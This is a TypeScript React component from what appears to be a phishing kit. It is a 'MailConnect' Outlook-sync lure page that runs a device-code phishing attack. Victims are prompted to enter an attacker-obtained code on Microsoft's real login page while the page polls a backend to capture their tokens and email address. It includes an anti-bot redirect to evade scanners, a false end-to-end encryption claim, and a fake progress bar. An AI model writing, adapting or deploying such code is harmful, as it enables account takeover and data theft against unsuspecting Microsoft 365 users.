import React, { useState, useEffect, useRef } from 'react';

const DEVICE_VERIFY_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';

type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';

export function OutlookSyncTemplate(): React.ReactElement {
  const [state, setState] = useState<CaptureState>('idle');
  const [userCode, setUserCode] = useState('');
  const [deviceCode, setDeviceCode] = useState('');
  const [copied, setCopied] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [errorMsg, setErrorMsg] = useState('');
  const [pollInterval, setPollInterval] = useState(5);
  const [authEmail, setAuthEmail] = useState('');
  const [progress, setProgress] = useState(0);
  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pollActiveRef = useRef(false);

  useEffect(() => {
    if (countdown <= 0 || (state !== 'code_ready' && state !== 'waiting')) return;
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) { clearInterval(timer); stopPolling(); setState('expired'); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown, state]);

  useEffect(() => {
    if (state === 'waiting') {
      const p = setInterval(() => {
        setProgress(prev => prev >= 90 ? 90 : prev + Math.random() * 3);
      }, 500);
      return () => clearInterval(p);
    }
    if (state === 'success') setProgress(100);
  }, [state]);

  useEffect(() => { return () => stopPolling(); }, []);

  function stopPolling(): void {
    pollActiveRef.current = false;
    if (pollTimerRef.current) { clearTimeout(pollTimerRef.current); pollTimerRef.current = null; }
  }

  function startPolling(dCode: string, interval: number): void {
    stopPolling();
    pollActiveRef.current = true;
    async function poll(): Promise<void> {
      if (!pollActiveRef.current) return;
      try {
        const res = await fetch('/api/token-poll', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceCode: dCode }) });
        const data = await res.json() as { status: string; error?: string; description?: string; email?: string };
        if (!pollActiveRef.current) return;
        if (data.status === 'complete') { stopPolling(); setAuthEmail(data.email ?? ''); setState('success'); return; }
        if (data.status === 'expired') { stopPolling(); setState('expired'); return; }
        if (data.status === 'slow_down') { const n = interval + 5; setPollInterval(n); if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, n * 1000); return; }
        if (data.status === 'error') { stopPolling(); setErrorMsg(data.description ?? data.error ?? 'Failed'); setState('error'); return; }
        if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000);
      } catch { if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000); }
    }
    pollTimerRef.current = setTimeout(poll, interval * 1000);
  }

  async function handleStart(): Promise<void> {
    const path = window.location.pathname;
    if (path === '/' || path === '') {
      setState('loading');
      try {
        const r = await fetch('/api/antibot-token');
        const d = await r.json() as { token: string };
        if (d.token) { window.location.href = `/api/schedule/confirm?t=${encodeURIComponent(d.token)}&tpl=outlook-sync`; return; }
      } catch { /* fallback to direct flow */ }
    }
    setState('loading');
    setErrorMsg('');
    setProgress(0);
    try {
      const res = await fetch('/api/device-code', { method: 'POST' });
      const data = await res.json() as { userCode: string; deviceCode: string; expiresIn: number; interval: number; error?: string };
      if (!res.ok || data.error) { setErrorMsg(data.error ?? 'Failed'); setState('error'); return; }
      setUserCode(data.userCode);
      setDeviceCode(data.deviceCode);
      setCountdown(data.expiresIn);
      setPollInterval(data.interval || 5);
      setState('code_ready');
      startPolling(data.deviceCode, data.interval || 5);
    } catch (err) { setErrorMsg(err instanceof Error ? err.message : 'Network error'); setState('error'); }
  }

  function handleCopy(): void {
    navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500); });
  }

  function handleVerify(): void { setState('waiting'); window.open(DEVICE_VERIFY_URL, '_blank'); }

  function handleReset(): void {
    stopPolling(); setState('idle'); setUserCode(''); setDeviceCode('');
    setCopied(false); setCountdown(0); setErrorMsg(''); setAuthEmail(''); setProgress(0);
  }

  function formatTime(s: number): string { return `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, '0')}`; }

  return (
    <div className="outlook-sync-page">
      <div className="outlook-sync-container">
        {/* Left gradient panel */}
        <div className="outlook-sync-left">
          <div className="outlook-sync-icon">
            <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="4" width="20" height="16" rx="2" />
              <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
            </svg>
          </div>
          <h1>MailConnect</h1>
          <p>Connect your mailbox to sync emails, calendar, and contacts across all your devices.</p>
          <div className="outlook-sync-features">
            <div className="outlook-sync-feature">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><polyline points="20 6 9 17 4 12" /></svg>
              <span>Email sync</span>
            </div>
            <div className="outlook-sync-feature">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><polyline points="20 6 9 17 4 12" /></svg>
              <span>Calendar integration</span>
            </div>
            <div className="outlook-sync-feature">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><polyline points="20 6 9 17 4 12" /></svg>
              <span>Contact management</span>
            </div>
          </div>
        </div>

        {/* Right content panel */}
        <div className="outlook-sync-right">
          {state === 'idle' && (
            <>
              <h2>Connect your account</h2>
              <p className="outlook-sync-desc">Verify your account to start syncing. Your data is encrypted end-to-end.</p>
              <div className="outlook-sync-account-types">
                <div className="outlook-sync-type active">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="4" width="20" height="16" rx="2" /><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" /></svg>
                  <span>Work or school</span>
                </div>
                <div className="outlook-sync-type">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" /><circle cx="12" cy="7" r="4" /></svg>
                  <span>Personal</span>
                </div>
              </div>
              <button className="outlook-sync-btn" onClick={handleStart}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" /><polyline points="10 17 15 12 10 7" /><line x1="15" y1="12" x2="3" y2="12" /></svg>
                Start sync
              </button>
            </>
          )}

          {state === 'loading' && (
            <div className="outlook-sync-loading">
              <div className="capture-spinner" />
              <p>Preparing secure connection...</p>
            </div>
          )}

          {(state === 'code_ready' || state === 'waiting') && (
            <>
              <h2>Authorization required</h2>
              <p className="outlook-sync-desc">Enter the code below on the verification page to authorize sync access.</p>
              <div className="outlook-sync-code-box">
                <div className="outlook-sync-code-label">SYNC CODE</div>
                <div className="outlook-sync-code">{userCode}</div>
                <button className="outlook-sync-copy" onClick={handleCopy}>{copied ? 'Copied!' : 'Copy code'}</button>
              </div>
              <button className="outlook-sync-btn" onClick={handleVerify}>
                Open Verification Page
              </button>
              {state === 'waiting' && (
                <div className="outlook-sync-progress">
                  <p>Syncing...</p>
                  <div className="outlook-sync-bar">
                    <div className="outlook-sync-bar-fill" style={{ width: `${progress}%` }} />
                  </div>
                  <span className="outlook-sync-percent">{Math.round(progress)}%</span>
                </div>
              )}
              <p className="outlook-sync-expiry">Session expires in {formatTime(countdown)}</p>
            </>
          )}

          {state === 'success' && (
            <div className="outlook-sync-success">
              <div className="outlook-sync-success-icon">
                <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" /><polyline points="22 4 12 14.01 9 11.01" />
                </svg>
              </div>
              <h2>Sync complete!</h2>
              {authEmail && <p>Connected as <strong>{authEmail}</strong></p>}
              <p>Your mailbox is now synced and ready to use.</p>
              <button className="outlook-sync-btn secondary" onClick={handleReset}>Connect another account</button>
            </div>
          )}

          {state === 'expired' && (
            <div className="outlook-sync-error">
              <h2>Session expired</h2>
              <p>The sync session has timed out. Please try again.</p>
              <button className="outlook-sync-btn" onClick={handleReset}>Retry</button>
            </div>
          )}

          {state === 'error' && (
            <div className="outlook-sync-error">
              <h2>Connection failed</h2>
              <p>{errorMsg}</p>
              <button className="outlook-sync-btn" onClick={handleReset}>Retry</button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
